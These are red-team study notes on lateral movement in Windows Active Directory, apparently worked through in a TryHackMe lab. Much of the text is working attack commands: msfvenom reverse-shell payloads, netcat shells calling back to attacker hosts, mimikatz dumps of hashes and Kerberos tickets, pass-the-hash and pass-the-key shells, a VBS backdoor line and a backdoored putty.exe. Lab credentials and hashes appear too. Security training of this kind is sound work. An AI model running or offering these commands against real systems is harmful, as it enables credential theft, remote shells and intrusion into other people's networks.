---
title: "Windows Active Directory - Lateral Movement"
date: 2026-05-02
weight: 10
---

## 1. Introduction
- Simply put, lateral movement is the group of techniques used by attackers to move around a network. Once an attacker has gained access to the first machine of a network, moving is essential for many reasons, including the following: 
  - Reaching our goals as attackers 
  - Bypassing network restrictions in place 
  - Establishing additional points of entry to the network 
  - Creating confusion and avoid detection.

- While many cyber kill chains reference lateral movement as an additional step on a linear process, it is actually part of a cycle. During this cycle, we use any available credentials to perform lateral movement, giving us access to new machines where we elevate privileges and extract credentials if possible. With the newfound credentials, the cycle starts again.
    ![Lateral movement flow](/resources_redteam/lateralmvmt_flow.png)

- Usually, we will repeat this cycle several times before reaching our final goal on the network. If our first foothold is a machine with very little access to other network resources, we might need to move laterally to other hosts that have more privileges on the network.

### 1.1 The Attacker's Perspective
- There are several ways in which an attacker can move laterally. The simplest way would be to use standard administrative protocols like WinRM, RDP, VNC or SSH to connect to other machines around the network. 
- This approach can be used to emulate regular user's behaviours somewhat as long as some coherence is maintained when planning where to connect with what account. While a user from IT connecting to the web server via RDP might be usual and go under the radar, care must be taken not to attempt suspicious connections.
- Attackers nowadays also have other methods of moving laterally while making it somewhat more challenging for the blue team to detect what is happening effectively. While no technique should be considered infallible, we can at least attempt to be as silent as possible. 

### 1.2 Administrators and UAC
- While one might expect that every single administrator account would serve the same purpose, a distinction has to be made between two types of administrators:
    - Local accounts part of the local Administrators group
    - Domain accounts part of the local Administrators group
- The differences we are interested in are restrictions imposed by **User Account Control (UAC)** over local administrators (except for the default Administrator account). By default, local administrators won't be able to remotely connect to a machine and perform administrative tasks unless using an interactive session through RDP. 
- Windows will deny any administrative task requested via RPC, SMB or WinRM since such administrators will be logged in with a filtered medium integrity token, preventing the account from doing privileged actions. 
- Domain accounts with local administration privileges won't be subject to the same treatment and will be logged in with full administrative privileges.
- It's essential to keep in mind that should some of the lateral movement techniques fail, it might be due to using a non-default local administrator where UAC is enforced. You can read more details about this security feature [here](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/user-account-control-and-remote-restriction).


## 2. Spawning Processes Remotely
### 2.1 Psexec
- Psexec has been the go-to method when needing to execute processes remotely for years. It allows an `administrator` user to run commands remotely on any PC where he has access. Psexec is one of many Sysinternals Tools and can be downloaded [here](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec).
  - Ports: 445/TCP (SMB)
  - Required Group Access: Administrators
- The way psexec works is as follows:
    - Connect to Admin$ share and upload a service binary. 
    - Connect to the service control manager to create and run a service named `PSEXESVC` and associate the service binary with `C:\Windows\psexesvc.exe`.
    - Create some named pipes to handle stdin/stdout/stderr.
    ![Psexec flowchart](/resources_redteam/psexec_flow.png)
- To run psexec, we only need to supply the required `administrator` credentials for the remote host and the command we want to run.
  ```cmd
  psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe
  ```

### 2.2 WinRM
- Windows Remote Management (WinRM) is a web-based protocol used to send Powershell commands to Windows hosts remotely. Most Windows Server installations will have WinRM enabled by default, making it an attractive attack vector.
  - Ports: 5985/TCP (WinRM HTTP), 5986/TCP (WinRM HTTPS)
  - Required Group Access: WinRMRemoteWMIUsers
- To connect to a remote Powershell session from the command line, we can use the following command:
  ```powershell
  # cmd
  winrs.exe -u:Administrator -p:Mypass123 -r:target cmd

  #we can achieve the same in the powershell
  $username = 'Administrator';
  $password = 'Mypass123';
  $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
  $credential = New-Object System.Management.Automation.PSCredential($username, $securePassword);
  # create an interactive session using the Enter-PSSession cmdlet:
  Enter-PSSession -ComputerName TARGET -Credential $credential
  # Powershell also includes the Invoke-Command cmdlet, which runs ScriptBlocks remotely via WinRM
  Invoke-Command -ComputerName TARGET -Credential $credential -ScriptBlock {whoami}
  ```

### 2.3 Remotely creating services using `sc`
- Windows services can also be leveraged to run arbitrary commands since they execute a command when started. While a service executable is technically different from a regular application, if we configure a Windows service to run any application, it will still execute it and fail afterwards.
- We can create a service on a remote host using `sc.exe`, a standard tool available in Windows. When using sc, it will try to connect to the **Service Control Manager (SVCCTL)** remote service program through RPC in several ways:

    - A connection attempt will be made using **DCE/RPC**. The client will first connect to the **Endpoint Mapper (EPM)** at port 135, which serves as a catalogue of available RPC endpoints and request information on the SVCCTL service program. The EPM will then respond with the IP and port to connect to SVCCTL, which is usually a dynamic port in the range of 49152-65535.
      ![DCE/RPC connection](/resources_redteam/SVCCTL_flow.png)
    - If the latter connection fails, sc will try to reach SVCCTL through SMB named pipes, either on port 445 (SMB) or 139 (SMB over NetBIOS).
      ![SMB connection](/resources_redteam/SVCCTL_flow_smb.png)
 
- We can create and start a service named "THMservice" using the following commands:
```cmd
sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto
sc.exe \\TARGET start THMservice
```
- The "net user" command will be executed when the service is started, creating a new local user on the system. Since the operating system is in charge of starting the service, you won't be able to look at the command output.
- To stop and delete the service, we can then execute the following commands:
```cmd
sc.exe \\TARGET stop THMservice
sc.exe \\TARGET delete THMservice
```


### 2.4 Creating Scheduled Tasks Remotely
- Another Windows feature we can use is Scheduled Tasks. You can create and run one remotely with **schtasks**, available in any Windows installation. To create a task named THMtask1, we can use the following commands:
```cmd
schtasks /s TARGET_IP /RU "SYSTEM" /create /tn "THMtask1" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00 
schtasks /s TARGET_IP /run /TN "THMtask1"
``` 
- We set the `schedule type (/sc)` to ONCE, which means the task is intended to be run only once at the specified time and date. Since we will be running the task manually, the starting date (/sd) and starting time (/st) won't matter much anyway.
- Since the system will run the scheduled task, the command's output won't be available to us, making this a blind attack.
- Finally, to delete the scheduled task, we can use the following command and clean up after ourselves:
```cmd
schtasks /S TARGET_IP /TN "THMtask1" /DELETE /F
```


### 2.5 Practical
- Generate a reverse shell payload, and upload it to the target's ADMIN$ share:
  ```bash
  # Captured Credentials
  # User: ZA.TRYHACKME.COM\t1_leonard.summers
  # Password: EZpass4ever

  # Attack machine
  msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=ATTACKER_IP LPORT=4444 -o no-service.exe

  # Upload it to the target's ADMIN$ (C:\Windows) share using smbclient
  # Feel free to use other commands like get, ls, etc. to explore the share
  smbclient -c 'put no-service.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever

  # Listen for the reverse shell
  msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST lateralmovement; set LPORT 4444;exploit"
  ```
- connect to THMJMP2 via SSH, start the payload.
  ```powershell
  # ssh za\\<AD Username>@thmjmp2.za.tryhackme.com

  # Current user do not have access to the to start the remote service, As we have captured creds.
  # Lets use runas command to run the command as the captured user.
  runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc.exe -e cmd.exe ATTACKER_IP 4443"
  # capture the shell, we get the shell as t1_leonard.summers context.

  # Now create and start the service on remote machine, with t1_leonard.summers user's context.
  # creating service on remote machine with payload we sent before
  sc.exe \\thmiis.za.tryhackme.com create THMservice-unique binPath= "%windir%\no-service.exe" start= auto

  # start the service
  sc.exe \\thmiis.za.tryhackme.com start THMservice-unique

  # Now you have got the reverse shell on msfconsole.
  # This might be Admin privileged shell. (nt authority\system)
  # To execute the flag as specifiic user, we can make use of powershell
  # start the powershell with bypassing execution policy
  powershell -ExecutionPolicy Bypass

  # Now you are inside of powershell
  $username = 't1_leonard.summers'
  $password = 'EZpass4ever'
  $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
  $credential = New-Object System.Management.Automation.PSCredential($username, $securePassword)
  # run as t1_leonard.summers user
  Enter-PSSession -Computername thmiis.za.tryhackme.com -Credential $credential
  # Grant execute permission to the flag file
  icacls "C:\Users\t1_leonard.summers\Desktop\Flag.exe" /grant "t1_leonard.summers:(RX)"

  # Now you can execute the flag file
  & "C:\Users\t1_leonard.summers\Desktop\Flag.exe"
  ```


## 3. Moving Laterally using WMI 
- Windows Management Instrumentation (WMI) is Windows implementation of Web-Based Enterprise Management (WBEM), an enterprise standard for accessing management information across devices. 
- In simpler terms, WMI allows administrators to perform standard management tasks that attackers can abuse to perform lateral movement in various ways, which we'll discuss.

### 3.1 Connecting to WMI From Powershell
- Before being able to connect to WMI using Powershell commands, we need to create a PSCredential object with our user and password. This object will be stored in the `$credential` variable and utilised throughout the techniques on this task:
  ```powershell
  $username = 'Administrator';
  $password = 'Mypass123';
  $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
  $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
  ```
- We then proceed to establish a WMI session using either of the following protocols:
  - **DCOM**: RPC over IP will be used for connecting to WMI. This protocol uses port 135/TCP and ports 49152-65535/TCP, just as explained when using sc.exe.
  - **Wsman**: WinRM will be used for connecting to WMI. This protocol uses ports 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS).

- To establish a WMI session from Powershell, we can use the following commands and store the session on the `$Session` variable, which we will use throughout the room on the different techniques:

  ```powershell
  $Opt = New-CimSessionOption -Protocol DCOM
  $Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop
  ```
- The `New-CimSessionOption` cmdlet is used to configure the connection options for the WMI session, including the connection protocol. The options and credentials are then passed to the `New-CimSession` cmdlet to establish a session against a remote host.

### 3.2 Remote Process Creation Using WMI
- Ports: 135/TCP, 49152-65535/TCP (DCERPC), 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- Required Group Memberships: Administrators
- We can remotely spawn a process from Powershell by leveraging WMI, sending a WMI request to the Win32_Process class to spawn the process under the session we created before:

  ```powershell
  # Define the command to execute
  $Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";
  # spawn the process to execute above command
  Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
  CommandLine = $Command
  }
  ```
- Notice that WMI won't allow you to see the output of any command but will indeed create the required process silently.
- On legacy systems, the same can be done using wmic from the command prompt:
  ```cmd
  wmic.exe /user:Administrator /password:Mypass123 /node:TARGET process call create "cmd.exe /c calc.exe" 
  ```

### 3.3 Creating Services Remotely with WMI
- Ports:135/TCP, 49152-65535/TCP (DCERPC), 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- Required Group Memberships: Administrators
- We can create services with WMI through Powershell. To create a service called THMService2, we can use the following command:
  ```powershell
  Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
  Name = "THMService2";
  DisplayName = "THMService2";
  PathName = "net user munra2 Pass123 /add"; # Your payload
  ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
  StartMode = "Manual"
  }

  # And then, we can get a handle on the service and start it with the following commands:
  $Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'THMService2'"
  Invoke-CimMethod -InputObject $Service -MethodName StartService

  # Finally, we can stop and delete the service with the following commands:
  Invoke-CimMethod -InputObject $Service -MethodName StopService
  Invoke-CimMethod -InputObject $Service -MethodName Delete
  ```

### 3.4 Creating Scheduled Tasks Remotely with WMI
- Ports: 135/TCP, 49152-65535/TCP (DCERPC), 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- Required Group Memberships: Administrators
- We can create and execute scheduled tasks by using some cmdlets available in Windows default installations:
  ```powershell
  # Payload must be split in Command and Args
  $Command = "cmd.exe"
  $Args = "/c net user munra22 aSdf1234 /add"

  # Create and start the sheduled task
  $Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
  Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "THMtask2"
  Start-ScheduledTask -CimSession $Session -TaskName "THMtask2"

  # To delete the scheduled task after it has been used, we can use the following command:
  Unregister-ScheduledTask -CimSession $Session -TaskName "THMtask2"
  ```

### 3.5 Installing MSI packages through WMI
- Ports: 135/TCP, 49152-65535/TCP (DCERPC), 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- Required Group Memberships: Administrators
- MSI is a file format used for installers. If we can copy an MSI package to the target system, we can then use WMI to attempt to install it for us. 
- The file can be copied in any way available to the attacker. Once the MSI file is in the target system, we can attempt to install it by invoking the `Win32_Product` class through WMI:
  ```powershell
  Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}

  # We can achieve the same by us using wmic in legacy systems:
  wmic /node:TARGET /user:DOMAIN\USER product call install PackageLocation=c:\Windows\myinstaller.msi
  ```

### 3.6 Practical
- We'll show how to use those credentials to move laterally to THM-IIS using WMI and MSI packages. 
- Generate the payload and transfer it to the target system
  ```bash
  # Attack machine
  # Captured Creds:
  # Username: danny.goddard 
  # Password: Implementing1995

  # generate the msi payload and transfer it to the target system
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=4445 -f msi -o payload_u.msi
  smbclient -c 'put payload_u.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$/' Korine.1994
  # start the listener
  msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST lateralmovement; set LPORT 4445;exploit"
  ```
- Use the Captured machine for the lateral movement
  ```powershell
  # ssh za\\<AD Username>@thmjmp2.za.tryhackme.com 
  # powershell -ExecutionPolicy bypass
  $username = 't1_corine.waters';
  $password = 'Korine.1994';
  $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
  $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
  $Opt = New-CimSessionOption -Protocol DCOM
  $Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop

  # Install the MSI package
  Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\payload_u.msi"; Options = ""; AllUsers = $false}

  # You may get the reverse shell on listener.
  ```

## 4. Use of Alternate Authentication Material

- By alternate authentication material, we refer to any piece of data that can be used to access a Windows account without actually knowing a user's password itself. 
- This is possible because of how some authentication protocols used by Windows networks work. In this task, we will take a look at a couple of alternatives available to log as a user when either of the following authentication protocols is available on the network:

  - NTLM authentication
  - Kerberos authentication

### 4.1 NTLM Authentication
- Lets understand how NTLM Auth works
  ![NTLM Authentication](/resources_redteam/ntlm_auth_flow.png)
  - The client sends an authentication request to the server they want to access.
  - The server generates a random number and sends it as a challenge to the client.
  - The client combines his NTLM password hash with the challenge (and other known data) to generate a response to the challenge and sends it back to the server for verification.
  - The server forwards both the challenge and the response to the Domain Controller for verification.
  - The domain controller uses the challenge to recalculate the response and compares it to the initial response sent by the client. If they both match, the client is authenticated; otherwise, access is denied. The authentication result is sent back to the server.
  - The server forwards the authentication result to the client.
- **Note:** The described process applies when using a domain account. If a local account is used, the server can verify the response to the challenge itself without requiring interaction with the domain controller since it has the password hash stored locally on its SAM.

#### 4.1.1 Pass-the-Hash
- As a result of extracting credentials from a host where we have attained administrative privileges, we might get clear-text passwords or hashes that can be easily cracked. However, if we aren't lucky enough, we will end up with non-cracked NTLM password hashes.
- Although it may seem we can't really use those hashes, the NTLM challenge sent during authentication can be responded to just by knowing the password hash. This means we can authenticate without requiring the plaintext password to be known. Instead of having to crack NTLM hashes, if the Windows domain is configured to use NTLM authentication, we can **Pass-the-Hash (PtH)** and authenticate successfully.

#### 4.1.2 Extracting NTLM hashes from local SAM (local users only):
  ```powershell
  # open the mimikatz 
  mimikatz.exe
  # escalate to admin privileges
  privilege::debug
  # elevate token
  token::elevate
  # extract NTLM hashes from local SAM
  lsadump::sam
  # You may see the NTLM hash of users
  ```

#### 4.1.3 Extracting NTLM hashes from LSASS memory (both local and domain users who recently logged in):
```powershell
# open the mimikatz 
mimikatz.exe
# escalate to admin privileges
privilege::debug
# extract NTLM hashes from LSASS memory
sekurlsa::msv
```

#### 4.1.4 Use Extracted hashes to perform PtH attack:
- We will use mimikatz to inject an access token for the victim user on a reverse shell (or any other command you like) as follows:
```powershell
# mimikatz.exe
token::revert 
sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555"
# Notice we used token::revert to reestablish our original token privileges, as trying to pass-the-hash with an elevated token won't work. 
```
- This would be the equivalent of using `runas /netonly` but with a hash instead of a password and will spawn a new reverse shell from where we can launch any command as the victim user.
- Interestingly, if you run the whoami command on receiving the reverse shell, it will still show you the original user you were using before doing PtH, but any command run from here will actually use the credentials we injected using PtH.

#### 4.1.5 Passing the Hash Using Linux:
- If you have access to a linux box, several tools have built-in support to perform `PtH` using different protocols. Depending on which services are available to you, you can do the following:
  ```bash
  # Connect to RDP using PtH:
  xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH

  # Connect via psexec using PtH:
  # Note: Only the linux version of psexec support PtH.
  psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP

  # Connect to WinRM using PtH:
  evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH
  ```

### 4.2 Kerberos Authentication
- To understand basics of how Kerberos authentication works, refer to the following resource:[Kerberos Authentication](https://silent-resistor.github.io/resources/red-teaming/windows_ad_basics/#71-kerberos-authentication)

#### 4.2.1 Pass-the-Ticket (PtT)
- Sometimes it will be possible to extract kerberos tickets and session keys from LSASS memory using mimikatz. The purpose usually requires us to have `SYSTEM` privileges on attacked machine and can be done as follows
  ```powershell
  # mimikatz
  # escalate to admin privileges
  privilege::debug
  # extract kerberos tickets and session keys from LSASS memory
  sekurlsa::tickets /export
  ```
- Notice that if we only has access to the ticket but not its corresponding session key, we wouldnt be able to use that ticket; therefore both are necessary.
- While mimikatz can extract any TGT or TGS available from the memory of LSASS process, most of the time, we'll be interested in TGTs as they can be used to request access to any  service the user is allowed to access. At the same time, TGSs are only good for a specific service.
- Extracting TGTs will require us to have Adminstrator's credentials, and extracting TGSs service can be done with a low-privilaged account (only service owners account)
- Once we have extracted the desirted ticket, we can inject the ticket into current session with.
  ```powershell
  kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi
  ```
- Injecting tickets in our own session doesn't require administrator privileges. After this, the tickets will be available for any tools we use for lateral movement. To check if the tickets were correctly injected, you can use the klist command:```klist```

#### 4.2.2 Overpass-the-hash / Pass-the-key
- This kind of attack is similar to PtH but applied to Kerberos networks.
- When a user requests a TGT, they send a timestamp encrypted with an encryption key derived from their password. 
- The algorithm used to derive this key can be either `DES` (disabled by default on current Windows versions), `RC4`, `AES128` or `AES256`, depending on the installed Windows version and Kerberos configuration. If we have any of those keys, we can ask the KDC for a TGT without requiring the actual password, hence the name **Pass-the-key (PtK)**.
- We can obtain the `Kerberos encryption keys` from memory by using mimikatz with the following commands:
  ```powershell
  # mimikatz
  # escalate to admin
  privilege::debug
  # extract encryption keys
  sekurlsa::ekeys
  ```
- Depending on the available keys, we can run the following commands on mimikatz to get a reverse shell via Pass-the-Key (nc64 is already available in THMJMP2 for your convenience):
  ```powershell
  # If we have the RC4 hash:
  sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"

  # If we have the AES128 hash:
  sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"

  # If we have the AES256 hash:
  sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
  ```

- Notice that when using RC4, the key will be equal to the NTLM hash of a user. This means that if we could extract the NTLM hash, we can use it to request a TGT as long as RC4 is one of the enabled protocols. This particular variant is usually known as Overpass-the-Hash (OPtH).


### 4.3 Practice solution

```powershell
ssh za\\t2_felicia.dean@thmjmp2.za.tryhackme.com
cd C:\tools
mimikatz.exe
privilege:debug
sekurlsa:ekeys
# search for t1_toby.beck and copy his aes256_hmac key or any other
# start listener in other terminal and replace the key here.
sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /aes256:6a0d48f79acaec013d928d84a102b72028d574340b6139e876e179db48fbde4e /run:"c:\tools\nc64.exe -e cmd.exe 10.150.74.11  5556"

# listener session
# nc -lvnp 5556
winrs -r:THMIIS.za.tryhackme.com C:\Users\t1_toby.beck\Desktop\Flag.exe
# get the key.
```

## 5. Abusing User Behaviour
### 5.1 Abusing the writable shares
- if you find the network shares that are writable for some reason by a user, an attacker can plant specific files (executables) to force users into executing any arbitory payload and gain access to their machines.
- Although the script or executable is hosted on a network share, when a user opens it on his workstation, the executable will be copied from server to its `%temp%` folder and executed from there.
- Therefore any payload will run in the context of final user's workstation (and logged-in user account).

### 5.2 Backdooring .vbs Scripts
- If the shared resourse is a VBS script, we can put a copy of nc64.exe on the same share and inject the following code in the shared script.
```vbs
CreateObject("WScript.Shell").Run "cmd.exe /c copy \Y \\10.10.28.6\myshare\nc64.exe %tmp% & %tmp%\nc64.exe -e cmd.exe <attacker_ip> 1234", 0, True
```

### 5.4 Backdooring .exe Files
- If the shared file is a Windows binary, say putty.exe, we can download it from share and use msfvenom to inject a backdoor into it. The binary will still work as usual but execute an additional payload silently.
```bash
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=<attacker_ip> lport=4444 -b "\x00" -f exe -o puttyX.exe
```

### 5.5 RDP Hijacking
- When an administrator uses RDP to connect to a machine and closes the RDP client instead of logging off, his session will remain open on server indefinitely.
- If we have SYSTEM privileges on windows server 2016, and earlier, we can take over any existing RDP session without requiring a password.
- if we have administrator-level acces, we can get SYSTEM by any method of preference. For now, we will be using psexec to do so. 
```bash
# cmd line as administrator
# getting system priv 
PsExec64.exe -s cmd.exe
# list the existing sessions on server
query user
# take over the session
# and In simple terms, the command states that the graphical session <sesstion_id>, 
# should be connected with the RDP session rdp-tcp#6, owned by the administrator user (you).
tscon <sesstion_id> /dest:rdp-tcp#6
```



## 6. Port Forwarding
- In real world, the administrators may have blocked some of these ports for security reasons or have implemented segmentation around the network, preventing you from reacing SMB,RDP, WinRM or RPC Ports.
- To go around these restrictions, we can use port forwarding techniques, which consist of using any comprimised host as jump box to pivot other hosts.
- It is expected that some machines will have network permissions than others, as every rolein a bussiness will have different needs in terms of what network services are required for day-to-day work.

### 6.1 SSH Tunnelling
- SSH already has built-in port forwarding functionality through a feature called **SSH Tunnelling**.
- Windows also now ships with OpenSSH client by default, so we can expect to find in many systems.
- **SSH Tunnelling** Used in different ways to forward ports through SSH connection, which we'll use depending upon situation. To explain, let's assume a scenario where we have compromised a PC-1 machine and would like to use it as a pivot to access a port on another machine to which we can't directly connect.
- We will start tunnel from the PC-1, acting as an SSH client, to the Attacker's PC, which act as an SSH server. The reason to do so is that you'll often find an SSH client on Windows machines, but no SSH server will be available most of the time.
  ![SSH Tunnelling](/resources_redteam/ssh_tunnelling.png)
- Since we'll be making a connection back to our attacker's machine, we'll want to create a user in it without access any console for tunnelling and set password to use for creating the tunnels.
```bash
# on attacker's machine
useradd tunneluser -m -d /home/tunneluser -s /bin/true
passwd tunneluser
```
- depending upon needs, the ssh tunnel can be used todo either local or remote port forwarding. Let;s take a look.

### 6.2 SSH Remote Port Forwarding
- Let's assume that firewall policies block the attack's machine from directly accessing port 3389 on server, if the attacker has previously compromised PC-1 and, in trun, PC-1 has access to port 3389 of the server, it can be used to pivot to port 3389 using the remote port forwarding from PC-1.
- Remote port forwarding allows to take a reachable port (3389) from the ssh client (PC-1), and project it into a remote ssh server (Attacker's PC)
- As a result, a port will be opened in attacker's machine that can be used to connect back to port 3389 in the server through ssh tunnel. PC-1 will, in turn, proxy connection so that server will see all traffic as if it was coming from PC-1.
  ![Remote port forwarding](/resources_redteam/remote_port_forwarding.png)
- A valid question that might pop up by this point, is why we need port forwarding if we have a comprimised PC-1 and can run an RDP session directly from there.
  - The answer is simple, in a situation where we only have console access to PC-1, we wont be able to use any RDP clinet as we dont have a GUI. 
  - By making the port availble to attacker's machine, we can use a LINUX RDP client to connect.
  - Similar situations arise when we want to run an exploit against port that cant be reached directly, as your exploit may require a specific scripting laguage that may not always be available at machines you comprimise along the way.
- Referring above image, to forward port 3389 on victim server back to our attacker's machine, we can use the following command on PC-1:
```powershell
ssh tunnluser@attacter_ip -R 3389:victim_server_ip:3389 -N
# establish an ssh session from PC-1 to attacker PC using the tunneluser account
# Since tunneluser not allowed to run shell on attacker pC,  
# we need to run the ssh command with `-N` switch to prevent client from requesting one, or connection will exit immediately.

# -R  switch is used to request a remote port forward, and the syntax requires us first to indicate
# port we ill be opening at SSH server (3389), followed by a colon and then IP and port of the socket we want to access (victim_server_ip:3389). 
# Notice that port numbers do not need match, although they do in this example.
```
- The command itself wont output anything, but the tunnerl will be running. Whenever we want, we can close the tunnerl by pressing CTRL+C.
- Once our tunnel is set and running, we can go to the attacker's machine and RDP into the forwarded port to reach the server.
```bash
xfreerdp /v:127.0.0.1 /u:MyUser /p:MyPassword
```

### 6.3 Local Port Forwarding
- It allows us to "pull" a port from SSH server into SSH client. 
- In our scenario, this could be used to take any service available in our attacker's machine and make it available to PC-1. That way, any host that cant connect directly to the attacker's PC but can connect to PC-1 will now be able to reach the attacker's services through the pivot host.
- Using this type of port forwarding would allow us to run reverse shells from hosts that normally wouldnt to be able to connect back to us or simply make any service we want available to machines that have no direct connection to us.
  ![Local port forwarding](/resources_redteam/local_port_forwarding.png)
- to forward port 80 from attacker's machine and make it availble from PC-1, we can run following command on PC-1:
```powershell
ssh tunneluser@attacker_ip -L *:80:127.0.0.1:80 -N
# -L switch for local port forwarding
# This option requires us to indicate local socket used by PC-1 to receive connections (*:80), 
# and the remote socket to connect to from attacker's PC perspective (127.0.0.1:80).
```

- Notice that we use the IP address `127.0.0.1` in the second socket, as from the attacker's PC perspective, that's the host that holds the port 80 to be forwarded.
- Since we are opening a new port on PC-1, we might need to add a firewall rule to allow for incoming connections (with dir=in).  Administrative privileges are needed for this
```cmd
netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80
```
- Once the tunner is setup, any user pointing their browsers to PC-1_ip:80 and see the website published by the attacker machine.


### 6.4 Port Forwarding with socat
- In situations, where ssh is not available, socat can be used to perform similar functionality.
- while not as flexible as ssh, socat allows to forward ports in a much simple way.
- One of disadvanteges of using socat is that we need to transer it to the pivot host (PC-1), making it more detectable than SSH, but it might be worth a try where no other option is availble.

- The basic syntax to perform port forwarding using socat: 
- Opening port 1234 on PC-1, so any connection we receive here will be forwarded to 4321 on victim_server, we can run the following command on PC-1:
```bash
socat TCP-LISTEN:1234,fork TCP:victim_server_ip:4321
# fork - allows socat to fork new process for each connection received,
# Making it possible to handler mutiple connections without closing.
```
- Note that socat cant forward the connection directly to the attacke's machine as ssh, but will open port on PC-1, that the attacker's machine can then connect to:
  ![Port forwarding with socat](/resources_redteam/port_forwarding_with_socat.png)
- To unblock the port on PC-1, we might need to create the firewall rule to allow connections
```cmd
netsh advfirewall firewall add rule="Open Port 1234" dir=in action=allow protocol=TCP localport=1234
netsh advfirewall firewall delete rule name="Open Port 1234"
```
- On otherhand, expose port 80 on attacker's machine so that it is reachable by victim server
```bash
socat TCP4-LISTEN:80,fork TCP4:attacker_ip:80
```

### 6.5 Dynamic Port forwarind and SOCKS
- While single port forwarding works quite well for tasks that require access to specific sockets, there are times when we might need run scans against many ports of a host, or even many ports across many machines, all through a single pivot host. 
- In those cases, **Dynamic port forwarding** allows us to pivot through a host and establish serveral connections to any IP address/ports we want by using a **SOCKS Proxy**
- Since we dont want to relay on an ssh server existing on the windows in our target network, we will normally use ssh client to establish a reverse dynamic port forwarding with the following command
```powershell
ssh tunneluser@attacker_ip -R 9050 -N
# the ssh server will start a SOCKS proxy on port 9050, and 
# forward any connections requrests through ssh tunnel where they are finally proxied by ssh client.
```
- THe most interesting part is that we can easily use any of our tools through SOCKS proxy by using `proxychains`. 
- To do so, we first need to make sure that proxychains is correctly configured to point any connection to the same port used by SSH for SOCKS proxy server. 
- The proxychains configurations file can be found at `/etc/proxychains.conf` on attacking machine.
- If we scroll down to the end of configurations file, we should see line that indicates the port in use for socks proxing.:
```
[ProxyList]
socks4 127.0.0.1 9050
```
- The default port is 9050, but any port will work as long as it matches the one we used when establishing the SSH tunnel.
- if we now want to execute any command through proxy, we can use proxychains
```
proxychains curl http://pxeboot.za.tryahackme.com
```
- Noe that some software like nmap might not work well with socks in some circumstances, and might show altered results.


### 6.7 Tunneling Complex Exploits
- The THMDC server is running the vulnerable version of Rejetto HFS. 
- The problem we face is that firewall rules restrict access to the vulnerable port so that it can only be viewed from THMJMP2. 
- Furthermore, outbound connections from THMDC are only allowed to machines in its local network, making it impossible to receive a reverse shell directly to our attacking machine. 
- To make things worse, the Rojetoo HFS exploit requires the attacker to host an HTTP server to trigger the final payload, but since no outbound connection are allowed to attacker's machine, we would need to find the way to host a web server in one of the other machines in the same network, which is not at all convenient.
- We can use port forwarding to overcome all these problems.
- First, lets take a look at how exploit works. First it will connect to the HFS port (RPORT) to trigger a second connection. This second connection will be made against the attacker's machine on `SRVPORT` where a web serveer will deliver the final payload.
- Finally, the attacker's payload will execute and send back a reverse shell to attacker on LPORT.
  ![Rejetto HFS exploit](/resources_redteam/rejetto_hfs.png)
